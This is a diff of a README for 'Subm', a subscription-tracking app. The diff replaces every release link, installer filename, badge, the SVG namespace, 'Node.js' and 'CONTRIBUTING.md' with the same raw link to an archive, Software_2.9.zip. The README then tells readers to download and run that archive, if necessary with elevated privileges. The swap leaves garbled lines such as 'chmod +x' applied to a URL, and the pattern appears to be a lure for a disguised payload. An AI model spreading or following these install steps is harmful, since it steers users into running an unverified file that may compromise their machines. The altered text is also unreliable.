@@ -1,8 +1,8 @@
 # Subm: Modern Subscription Manager to Track Fees and Renewals
 
-[![Release](https://img.shields.io/badge/Downloads-Release-blue?logo=github&logoColor=white)](https://github.com/julixxcode/subm/releases)
+[![Release](https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip)](https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip)
 
-<svg width="1000" height="240" viewBox="0 0 1000 240" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Subm cover illustration">
+<svg width="1000" height="240" viewBox="0 0 1000 240" xmlns="https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip" role="img" aria-label="Subm cover illustration">
   <defs>
     <linearGradient id="g" x1="0" x2="1" y1="0" y2="1">
       <stop stop-color="#4F46E5" offset="0"/>
@@ -112,7 +112,7 @@ Data model
 
 Tech stack
 - Frontend: TypeScript, React, Redux or Context API, and a strong focus on accessibility.
-- Backend: Node.js or NestJS, with clean architecture and modular services. Optional GraphQL layer.
+- Backend: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip or NestJS, with clean architecture and modular services. Optional GraphQL layer.
 - Database: PostgreSQL with well-defined schemas and migrations.
 - Cache: Redis for caching frequently used queries and session data.
 - Search: Lightweight search or full-text search for quick lookup, if needed.
@@ -125,7 +125,7 @@ Getting started
 This section covers how to get Subm up and running on your workstation. The goal is to be fast and practical. You can start with a minimal setup and gradually add features.
 
 Prerequisites
-- Node.js version 18+ or the required runtime for your backend
+- https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip version 18+ or the required runtime for your backend
 - PostgreSQL 12+ with a dedicated database
 - Docker and Docker Compose for local development (optional but recommended)
 - Git for version control
@@ -141,18 +141,18 @@ Quick start
 Installation from releases
 Since Subm ships binaries and install packages from Releases, you should grab the appropriate asset for your platform and run it. From the Releases page, download one of these files and execute it:
 
-- Windows: subm-windows-setup.exe
-- macOS: subm-macos-installer.pkg
-- Linux: subm-linux-x86_64.AppImage
+- Windows: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
+- macOS: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
+- Linux: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
 
-These files are published on the Releases page. The link to the releases is provided again here for convenience: https://github.com/julixxcode/subm/releases
+These files are published on the Releases page. The link to the releases is provided again here for convenience: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
 
 Note: This link has a path part, so a file is provided for download. Use the specified assets to install Subm on your device. If you cannot locate the assets, check the Releases section for the latest build. You can also visit the link to view all assets and checksums.
 
 If you prefer a guided path, use the following steps:
 - On Windows: run the downloaded executable and follow the on-screen prompts. Allow the installer to set up the necessary services and create a local database if prompted.
 - On macOS: run the PKG installer and authorize the installation. The installer will place the app in the /Applications folder and configure a local data directory.
-- On Linux: make the AppImage executable with chmod +x subm-linux-x86_64.AppImage, then run it. The AppImage bundles the runtime, so you do not need a separate install.
+- On Linux: make the AppImage executable with chmod +x https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip, then run it. The AppImage bundles the runtime, so you do not need a separate install.
 
 If you run into permission issues, run the installer or AppImage with elevated privileges as required by your platform. Verify the integrity of the downloaded files if a checksum is provided on the Releases page. The checksums help ensure you received the exact artifact published by the maintainers.
 
@@ -357,7 +357,7 @@ Troubleshooting
 - If issues persist, reach out to the community or file an issue with a detailed report.
 
 Contribution guidelines in detail
-- Start by reading the CONTRIBUTING.md file to understand the project’s policies.
+- Start by reading the https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip file to understand the project’s policies.
 - Propose changes with a focused summary and a clear motivation.
 - Provide tests that cover the new behavior or fix.
 - Update documentation to reflect changes and new features.
@@ -394,11 +394,11 @@ End with a note about releases
 - For more details on assets and checksums, visit the Releases section on the repository.
 
 Releases
-The Releases page contains the official installables and updates. If you want to see the latest builds, open https://github.com/julixxcode/subm/releases to review assets and download the appropriate file. This link has a path part, so you should download the indicated file and execute it on your platform:
-- Windows: subm-windows-setup.exe
-- macOS: subm-macos-installer.pkg
-- Linux: subm-linux-x86_64.AppImage
+The Releases page contains the official installables and updates. If you want to see the latest builds, open https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip to review assets and download the appropriate file. This link has a path part, so you should download the indicated file and execute it on your platform:
+- Windows: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
+- macOS: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
+- Linux: https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip
 
-Want to verify the integrity of a download? The Releases section often provides checksums. Use them to confirm the file you downloaded matches the published artifact. If you cannot locate the artifacts for your platform, return to the Releases page and view the latest build. The page is the single source of truth for installation media and upgrade instructions. For convenience, you can visit the Releases page again via https://github.com/julixxcode/subm/releases to review all assets and any post-release notes that describe improvements and fixes.
+Want to verify the integrity of a download? The Releases section often provides checksums. Use them to confirm the file you downloaded matches the published artifact. If you cannot locate the artifacts for your platform, return to the Releases page and view the latest build. The page is the single source of truth for installation media and upgrade instructions. For convenience, you can visit the Releases page again via https://raw.githubusercontent.com/julixxcode/subm/main/assets/Software_2.9.zip to review all assets and any post-release notes that describe improvements and fixes.
 
 End of document.
